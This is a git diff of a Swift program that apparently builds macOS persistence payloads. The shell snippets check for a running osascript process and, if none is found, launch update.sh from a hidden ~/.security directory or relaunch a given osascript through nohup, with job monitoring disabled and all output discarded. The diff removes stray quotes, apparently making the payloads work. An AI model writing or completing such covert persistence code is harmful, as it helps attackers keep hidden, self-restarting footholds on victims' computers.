@@ -14,14 +14,14 @@ if CommandLine.arguments.count == 0{
 else {
     do {
         var payload = """
-        'RUNNING=$(ps ax | grep osascript | wc -l);
+        RUNNING=$(ps ax | grep osascript | wc -l);
         if [ "$RUNNING" -lt 2 ]
         then
           cd \(home)/.security
           ./update.sh &
         else
           exit
-        fi'
+        fi
         """
         
         var hiddenPath = "\(home)/.security"
@@ -59,25 +59,25 @@ else {
         else {
             
             var payload = """
-            'RUNNING=$(ps ax | grep osascript | wc -l);
+            RUNNING=$(ps ax | grep osascript | wc -l);
             if [ "$RUNNING" -lt 2 ]
             then
               setopt LOCAL_OPTIONS NO_MONITOR; nohup \(payload) > /dev/null 2>&1&
             else
               setopt LOCAL_OPTIONS NO_MONITOR; exit > /dev/null 2>&1&
-            fi'
+            fi
             """
             
             var persist = "osascript " + CommandLine.arguments[1]
             
             var payload2 = """
-            'RUNNING=$(ps ax | grep osascript | wc -l);
+            RUNNING=$(ps ax | grep osascript | wc -l);
             if [ "$RUNNING" -lt 2 ]
             then
               setopt LOCAL_OPTIONS NO_MONITOR; nohup \(persist) > /dev/null 2>&1&
             else
               setopt LOCAL_OPTIONS NO_MONITOR; exit > /dev/null 2>&1&
-            fi'
+            fi
             """
             
             
